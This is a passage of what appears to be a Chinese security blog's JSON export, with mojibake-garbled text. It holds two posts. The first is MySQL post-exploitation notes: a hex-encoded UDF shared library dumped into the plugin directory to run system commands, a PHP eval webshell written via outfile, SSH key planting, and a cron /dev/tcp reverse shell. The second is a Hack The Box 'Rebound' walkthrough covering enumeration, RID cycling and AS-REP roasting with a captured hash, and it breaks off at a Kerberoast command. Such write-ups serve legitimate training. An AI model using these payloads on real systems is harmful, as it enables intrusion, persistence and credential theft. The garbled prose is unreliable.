00012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000 INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';#åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°å¹¶è°ƒç”¨å‘½ä»¤CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';å¯¼å…¥æˆåŠŸåæŸ¥çœ‹ä¸€ä¸‹ mysql å‡½æ•°é‡Œé¢æ˜¯å¦æ–°å¢äº† sys_evalï¼šselect * from mysql.func;select sys_eval('whoami');#ä¸å¾—ä¸æä¸€ä¸‹,è¿™ç§æ–¹å¼ä¹Ÿæ˜¯ä¼šå—åˆ° secure_file_priv é™åˆ¶çš„;#å¹¶ä¸”/usr/lib/mysql/plugin/ ç›®å½•æƒé™ä¸€èˆ¬åªæœ‰rootæœ‰è®¿é—®æƒé™; outfile/dumpfileå‡½æ•°12345678910#å†™æœ¨é©¬æ–‡ä»¶select &quot;&lt;?php @eval($_POST['password']);?&gt;&quot; into outfile &quot;/var/www/html/shell.php&quot;;select &quot;&lt;?php @eval($_POST['password']);?&gt;&quot; into dumpfile &quot;/var/www/html/shell.php&quot;;#å†™å…¬é’¥#ç”Ÿæˆå…¬ç§é’¥:ssh-keygen -t rsaselect &quot;å…¬é’¥&quot; into outfile '/home/&lt;username&gt;/.ssh/authorized_keys';#å†™å®šæ—¶ä»»åŠ¡ç­‰select &quot;\\n\\n* * * * * bash -i&gt;&amp; /dev/tcp/your_ip/youur_port 0&gt;&amp;1\\n\\n&quot; into outfile /var/spool/cron/root; å‚è€ƒï¼šhttps://www.sqlsec.com/2020/11/mysql.html#æ–‡ç« æ€»ç»“ https://blog.zgsec.cn/archives/26.html https://shockerli.net/post/mysql-secure-file-priv/","link":"/2024/04/26/Mysql%E5%B0%8F%E8%AE%B0/"},{"title":"ReBound(HTB)","text":"ä»‹ç»Rebound æ˜¯ä¸€å°ç–¯ç‹‚çš„ Windows æœºå™¨ï¼Œå…·æœ‰æ£˜æ‰‹çš„ Active Directory ç¯å¢ƒã€‚é€šè¿‡ â€œRID cyclingâ€è¿›è¡Œçš„ç”¨æˆ·æšä¸¾æ­ç¤ºäº†ä¸€ä¸ª AS-REP-roastable ç”¨æˆ·ï¼Œå…¶ TGT ç”¨äº Kerberoast å¦ä¸€ä¸ªå…·æœ‰å¯ç ´è§£å¯†ç çš„ç”¨æˆ·ã€‚ ACL è¢«æ»¥ç”¨ä»¥è·å–å¯¹ OU å…·æœ‰å®Œå…¨æ§åˆ¶æƒé™çš„ç»„çš„è®¿é—®æƒé™ï¼Œæ‰§è¡Œåä»£å¯¹è±¡æ¥ç®¡ (DOT)ï¼Œç„¶åå¯¹å…·æœ‰ winrm è®¿é—®æƒé™çš„ç”¨æˆ·è¿›è¡Œ ShadowCredentials æ”»å‡»ã€‚åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šï¼Œåˆ©ç”¨è·¨ä¼šè¯ä¸­ç»§æ¥è·å–ç™»å½•ç”¨æˆ·çš„ NetNTLMv2 å“ˆå¸Œå€¼ï¼Œä¸€æ—¦ç ´è§£ï¼Œå°±ä¼šå¯¼è‡´ gMSA å¯†ç è¢«è¯»å–ã€‚æœ€åï¼ŒgMSA å¸æˆ·å…è®¸å§”æ´¾ï¼Œä½†æ— éœ€åè®®è½¬æ¢ã€‚åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾ (RBCD) ç”¨äºæ¨¡æ‹ŸåŸŸæ§åˆ¶å™¨ï¼Œä»è€Œå¯ç”¨ DCSync æ”»å‡»ï¼Œä»è€Œå¯¼è‡´æƒé™å®Œå…¨æå‡ã€‚ æ”¶é›†123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/windows/Rebound]â””â”€$ sudo nmap -p- --min-rate 10000 10.10.11.231 -oN nmap/ports.txtStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-11 10:58 EDTWarning: 10.10.11.231 giving up on port because retransmission cap hit (10).Nmap scan report for rebound.htb (10.10.11.231)Host is up (0.096s latency).Not shown: 65509 closed tcp ports (reset)PORT STATE SERVICE53/tcp open domain88/tcp open kerberos-sec135/tcp open msrpc139/tcp open netbios-ssn389/tcp open ldap445/tcp open microsoft-ds464/tcp open kpasswd5593/tcp open http-rpc-epmap636/tcp open ldapssl3268/tcp open globalcatLDAP3269/tcp open globalcatLDAPssl5985/tcp open wsman9389/tcp open adws47001/tcp open winrm49664/tcp open unknown49665/tcp open unknown49666/tcp open unknown49667/tcp open unknown49673/tcp open unknown49690/tcp open unknown49691/tcp open unknown49694/tcp open unknown49707/tcp open unknown49720/tcp open unknown49741/tcp open unknown49783/tcp open unknownNmap done: 1 IP address (1 host up) scanned in 15.19 secondsâ”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/windows/Rebound]â””â”€$ ports=$(cat nmap/ports.txt|grep open| awk -F &quot;/&quot; '{print $1}'|paste -sd ',')â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/windows/Rebound]â””â”€$ sudo nmap -sT -sC -sV -O -p$ports 10.10.11.231 -oN nmap/details.txtStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-11 10:59 EDTNmap scan report for rebound.htb (10.10.11.231)Host is up (0.085s latency).PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-09-11 15:05:29Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: | Subject Alternative Name: DNS:dc01.rebound.htb| Not valid before: 2023-08-25T22:48:10|_Not valid after: 2024-08-24T22:48:10|_ssl-date: 2024-09-11T15:06:44+00:00; +5m45s from scanner time.445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: | Subject Alternative Name: DNS:dc01.rebound.htb| Not valid before: 2023-08-25T22:48:10|_Not valid after: 2024-08-24T22:48:10|_ssl-date: 2024-09-11T15:06:44+00:00; +5m45s from scanner time.3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)|_ssl-date: 2024-09-11T15:06:44+00:00; +5m45s from scanner time.| ssl-cert: Subject: | Subject Alternative Name: DNS:dc01.rebound.htb| Not valid before: 2023-08-25T22:48:10|_Not valid after: 2024-08-24T22:48:103269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)|_ssl-date: 2024-09-11T15:06:44+00:00; +5m45s from scanner time.| ssl-cert: Subject: | Subject Alternative Name: DNS:dc01.rebound.htb| Not valid before: 2023-08-25T22:48:10|_Not valid after: 2024-08-24T22:48:105985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found9389/tcp open mc-nmf .NET Message Framing47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49664/tcp open msrpc Microsoft Windows RPC49665/tcp open msrpc Microsoft Windows RPC49666/tcp open msrpc Microsoft Windows RPC49667/tcp open msrpc Microsoft Windows RPC49673/tcp open msrpc Microsoft Windows RPC49690/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049691/tcp open msrpc Microsoft Windows RPC49694/tcp open msrpc Microsoft Windows RPC49707/tcp open msrpc Microsoft Windows RPC49720/tcp open msrpc Microsoft Windows RPC49741/tcp open msrpc Microsoft Windows RPC49783/tcp open msrpc Microsoft Windows RPCWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portAggressive OS guesses: Microsoft Windows Server 2019 (96%), Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (92%), Microsoft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1809 - 2004 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 14393 (91%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time: | date: 2024-09-11T15:06:36|_ start_date: N/A|_clock-skew: mean: 5m44s, deviation: 0s, median: 5m44s| smb2-security-mode: | 3:1:1: |_ Message signing enabled and requiredOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 76.44 seconds å°†åŸŸåæ·»åŠ åˆ°/etc/hostsæ–‡ä»¶ä¸­ï¼› 1sudo bash -c &quot;echo '10.10.11.231 rebound.htb dc01.rebound.htb' &gt;&gt; /etc/hosts&quot; SMBç©ºå¯†ç å¯ä»¥è®¿é—®ä¸¤ä¸ªæ–‡ä»¶å¤¹ï¼Œ 1234567891011121314151617181920212223242526â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/windows/Rebound]â””â”€$ smbmap -H 10.10.11.231 -u null ________ ___ ___ _______ ___ ___ __ _______ /&quot; )|&quot; \\ /&quot; || _ &quot;\\ |&quot; \\ /&quot; | /&quot;&quot;\\ | __ &quot;\\ (: \\___/ \\ \\ // |(. |_) :) \\ \\ // | / \\ (. |__) :) \\___ \\ /\\ \\/. ||: \\/ /\\ \\/. | /' /\\ \\ |: ____/ __/ \\ |: \\. |(| _ \\ |: \\. | // __' \\ (| / /&quot; \\ :) |. \\ /: ||: |_) :)|. \\ /: | / / \\ \\ /|__/ \\ (_______/ |___|\\__/|___|(_______/ |___|\\__/|___|(___/ \\___)(_______) ----------------------------------------------------------------------------- SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com https://github.com/ShawnDEvans/smbmap[*] Detected 1 hosts serving SMB[*] Established 1 SMB session(s) [+] IP: 10.10.11.231:445 Name: rebound.htb Status: Authenticated Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share IPC$ READ ONLY Remote IPC NETLOGON NO ACCESS Logon server share Shared READ ONLY SYSVOL NO ACCESS Logon server share è¿™ä¸¤ä¸ªæ–‡ä»¶å¤¹çš†ä¸ºç©º 12345678910111213141516â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/windows/Rebound]â””â”€$ smbclient //10.10.11.231/IPC$ -NTry &quot;help&quot; to get a list of possible commands.smb: \\&gt; lsNT_STATUS_NO_SUCH_FILE listing \\*smb: \\&gt; exit â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/windows/Rebound]â””â”€$ smbclient //10.10.11.231/Shared -NTry &quot;help&quot; to get a list of possible commands.smb: \\&gt; ls . D 0 Fri Aug 25 17:46:36 2023 .. D 0 Fri Aug 25 17:46:36 2023 4607743 blocks of size 4096. 1039160 blocks availablesmb: \\&gt; exit RPCç©ºå¯†ç å¯ä»¥è¿æ¥ 12345â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/windows/Rebound]â””â”€$ rpcclient -U &quot;&quot; -N 10.10.11.231rpcclient $&gt; enumdomusersresult was NT_STATUS_ACCESS_DENIED NT_STATUS_ACCESS_DENIED é”™è¯¯è¡¨ç¤ºï¼Œç”±äº æƒé™ä¸è¶³ï¼ŒæœåŠ¡å™¨æ‹’ç»äº†è¯¥è¯·æ±‚ã€‚å…·ä½“æ¥è¯´ï¼Œè¿™æ„å‘³ç€å°è¯•æšä¸¾åŸŸç”¨æˆ·æ—¶ï¼Œæ‰€ä½¿ç”¨çš„è´¦æˆ·æ²¡æœ‰è¶³å¤Ÿçš„æƒé™æ¥æ‰§è¡Œè¯¥æ“ä½œã€‚ é€šè¿‡rid-cycling-attackæ‰‹æ³•æšä¸¾ç”¨æˆ· 12345678910111213141516171819202122232425262728293031323334353637383940414243â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/windows/Rebound]â””â”€$ lookupsid.py -no-pass 'guest@rebound.htb' 20000Impacket v0.12.0.dev1+20240830.154152.9aa0954b - Copyright 2023 Fortra[*] Brute forcing SIDs at rebound.htb[*] StringBinding ncacn_np:rebound.htb[\\pipe\\lsarpc][*] Domain SID is: S-1-5-21-4078382237-1492182817-2568127209498: rebound\\Enterprise Read-only Domain Controllers (SidTypeGroup)500: rebound\\Administrator (SidTypeUser)501: rebound\\Guest (SidTypeUser)502: rebound\\krbtgt (SidTypeUser)512: rebound\\Domain Admins (SidTypeGroup)513: rebound\\Domain Users (SidTypeGroup)514: rebound\\Domain Guests (SidTypeGroup)515: rebound\\Domain Computers (SidTypeGroup)516: rebound\\Domain Controllers (SidTypeGroup)517: rebound\\Cert Publishers (SidTypeAlias)518: rebound\\Schema Admins (SidTypeGroup)519: rebound\\Enterprise Admins (SidTypeGroup)520: rebound\\Group Policy Creator Owners (SidTypeGroup)521: rebound\\Read-only Domain Controllers (SidTypeGroup)522: rebound\\Cloneable Domain Controllers (SidTypeGroup)525: rebound\\Protected Users (SidTypeGroup)526: rebound\\Key Admins (SidTypeGroup)527: rebound\\Enterprise Key Admins (SidTypeGroup)553: rebound\\RAS and IAS Servers (SidTypeAlias)571: rebound\\Allowed RODC Password Replication Group (SidTypeAlias)572: rebound\\Denied RODC Password Replication Group (SidTypeAlias)1000: rebound\\DC01$ (SidTypeUser)1101: rebound\\DnsAdmins (SidTypeAlias)1102: rebound\\DnsUpdateProxy (SidTypeGroup)1951: rebound\\ppaul (SidTypeUser)2952: rebound\\llune (SidTypeUser)3382: rebound\\fflock (SidTypeUser)5277: rebound\\jjones (SidTypeUser)5569: rebound\\mmalone (SidTypeUser)5680: rebound\\nnoon (SidTypeUser)7681: rebound\\ldap_monitor (SidTypeUser)7682: rebound\\oorend (SidTypeUser)7683: rebound\\ServiceMgmt (SidTypeGroup)7684: rebound\\winrm_svc (SidTypeUser)7685: rebound\\batch_runner (SidTypeUser)7686: rebound\\tbrady (SidTypeUser)7687: rebound\\delegator$ (SidTypeUser) å°†ç”¨æˆ·åæ”¶é›†åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­ 123456789101112131415161718192021â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/windows/Rebound]â””â”€$ cat sid_result.txt|grep SidTypeUser|grep -oP 'rebound.\\K.*(?=\\()' &gt; username.txtâ”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/windows/Rebound]â””â”€$ cat username.txt Administrator Guest krbtgt DC01$ ppaul llune fflock jjones mmalone nnoon ldap_monitor oorend winrm_svc batch_runner tbrady delegator$ ç«‹è¶³AS-REP-roasttingå°è¯•â€AS-REP-roasttingâ€æ”»å‡»ï¼Œâ€œä¸è¦æ±‚Kerberosé¢„èº«ä»½éªŒè¯â€åœ¨â€jjonesâ€ç”¨æˆ·ä¸Šç”Ÿæ•ˆï¼›è¿”å›äº†ä¸€ä¸ªTGT; 123456789101112131415161718192021â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/windows/Rebound]â””â”€$ GetNPUsers.py -dc-ip 10.10.11.231 rebound.htb/ -usersfile username.txtImpacket v0.12.0.dev1+20240830.154152.9aa0954b - Copyright 2023 Fortra[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User ppaul doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User llune doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User fflock doesn't have UF_DONT_REQUIRE_PREAUTH set$krb5asrep$23$jjones@REBOUND.HTB:4c66ae7b7633af8f28c48084b200dedc$1bf2afd18bdfaf8b79bf4f257bc305fb42b25c8a4142ab2d10b8a3cd41cedf3b7064e45730f69c1b23ccf535e298b3694330fa395db591d75c3b3683fa2d797b2124ca8b97aad2ae6e52019f5cd7ef3dca64ac0ccb7a7a3a455bbde467c8a3c9cda41ca475ca43fa662e1ac73ef83adddbefda8a4c185092f8887ac87a53535eb3e4febfe1b4b1ecc2621219d2fad79d6cf842eb21929d47dee71f08d9a4f61649e7a052e08cfc878aea4208800bc98c44aac2e8cd6f914e63305f2e6a37922188e627c00a412c40e11c98d5ce6ecfc05b593150cc82e12b31b88153489e6782ca082da0127acd9c31fb[-] User mmalone doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User nnoon doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User ldap_monitor doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User oorend doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User winrm_svc doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User batch_runner doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User tbrady doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User delegator$ doesn't have UF_DONT_REQUIRE_PREAUTH set è€Œç„¶johnå’Œhashcatéƒ½æ— æ³•ç ´è§£å‡ºå¯†ç  123456789101112â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/windows/Rebound]â””â”€$ john jjones.hash --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])Will run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for status0g 0:00:00:09 DONE (2024-09-11 11:41) 0g/s 1477Kp/s 1477Kc/s 1477KC/s 0841079575..*7Â¡Vamos!Session completed. â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/windows/Rebound]â””â”€$ hashcat -m 18200 jjones.hash /usr/share/wordlists/rockyou.txt[SNIP] Kerberoastå½“æ‹¿åˆ°ä¸€ä¸ªâ€œä¸è¦æ±‚Kerberosé¢„èº«ä»½éªŒè¯â€çš„ç”¨æˆ·æ—¶ï¼Œå¯ä»¥å°è¯•Kerberoast ä¸å¸¦é¢„èº«ä»½éªŒè¯ 12345â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/windows/Rebound]â””â”€$ GetUserSPNs.py -no-preauth jjones -usersfile username.txt -dc-host 10.10.11.231 rebound.htb/ 